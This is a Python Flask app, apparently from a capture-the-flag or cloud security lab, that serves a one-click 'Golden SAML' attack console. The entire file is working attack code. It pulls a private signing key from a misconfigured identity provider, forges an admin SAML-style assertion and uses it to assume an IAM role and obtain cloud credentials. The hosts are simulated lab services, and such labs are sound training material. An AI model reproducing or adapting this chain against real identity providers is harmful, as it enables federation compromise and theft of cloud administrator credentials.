"""Golden SAML Attack Console — steal key, forge assertion, AssumeRoleWithSAML."""
import os, json, urllib.request, urllib.parse
from flask import Flask, request, render_template_string

app = Flask(__name__)
FLAG = os.environ.get("FLAG", "flag{cloud-13-default}")
IDP = os.environ.get("IDP_URL", "http://saml-idp:5000")
IAM = os.environ.get("IAM_URL", "http://iam:5000")

HTML = """<!DOCTYPE html><html><head><title>Golden SAML Attack</title></head><body>
<h1>Golden SAML — Federation Trust Root Compromise</h1>
<form method="post" action="/attack"><button>Execute Golden SAML Attack</button></form>
<pre>{{output}}</pre></body></html>"""

@app.route("/")
def home(): return render_template_string(HTML, output="Ready — click Execute")

@app.route("/attack", methods=["POST"])
def attack():
    output = []
    try:
        # Step 1: Steal private key from misconfigured IdP
        r = urllib.request.urlopen(f"{IDP}/keys/private.pem", timeout=5)
        key_data = json.loads(r.read().decode())
        output.append(f"[+] Stole private key! FLAG2={key_data.get('note','')[:60]}")
        # Step 2: Forge SAML assertion using the stolen key
        claims = {"sub": "admin@corp", "aud": "https://signin.aws.amazon.com/saml"}
        resp = urllib.request.urlopen(urllib.request.Request(f"{IDP}/sign",
            data=json.dumps({"claims": claims}).encode(),
            headers={"Content-Type": "application/json"}, method="POST"), timeout=5)
        token = json.loads(resp.read())["token"]
        output.append(f"[+] Forged SAML token: {token[:60]}...")
        # Step 3: AssumeRoleWithSAML (use AssumeRoleWithWebIdentity as sim)
        body = urllib.parse.urlencode({
            "Action": "AssumeRoleWithWebIdentity",
            "RoleArn": "arn:aws:iam::000000000000:role/SAMLAdminRole",
            "WebIdentityToken": token,
            "RoleSessionName": "golden-saml",
            "Version": "2011-06-15"
        }).encode()
        r3 = urllib.request.urlopen(urllib.request.Request(f"{IAM}/", data=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"}), timeout=5)
        xml = r3.read().decode()
        if "<Credentials>" in xml: output.append(f"[+] AssumeRole SUCCESS!\n{xml[:400]}")
        else: output.append(f"[-] Failed: {xml[:300]}")
    except Exception as e: output.append(f"[-] Error: {e}")
    return render_template_string(HTML, output="\n".join(output))

@app.route("/flag")
def flag():
    if request.remote_addr not in ("127.0.0.1","::1"): return "Forbidden", 403
    return FLAG

if __name__ == "__main__": app.run(host="0.0.0.0", port=5000)
